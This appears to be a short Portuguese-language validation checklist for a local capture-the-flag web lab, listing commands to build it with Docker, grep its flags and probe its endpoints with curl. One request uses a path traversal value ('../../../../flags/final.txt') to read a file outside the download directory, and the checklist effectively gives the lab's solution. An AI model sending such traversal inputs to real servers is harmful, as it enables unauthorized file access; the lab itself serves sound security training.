# Validacao do Release Candidate

Comandos esperados para validar o `web-basic-01`.

```bash
cd ~/ctf-labs
grep -Rho "FLAG{[^}]*}" web-basic-01 | sort -u
```

```bash
cd ~/ctf-labs/web-basic-01
sudo docker compose up --build
```

```bash
curl -i http://localhost:8080
curl -i http://localhost:8080/health
curl -i http://localhost:8080/robots.txt
curl -i http://localhost:8080/dev-notes.txt
curl -i "http://localhost:8080/download?file=public-info.txt"
curl -i "http://localhost:8080/download?file=../../../../flags/final.txt"
```

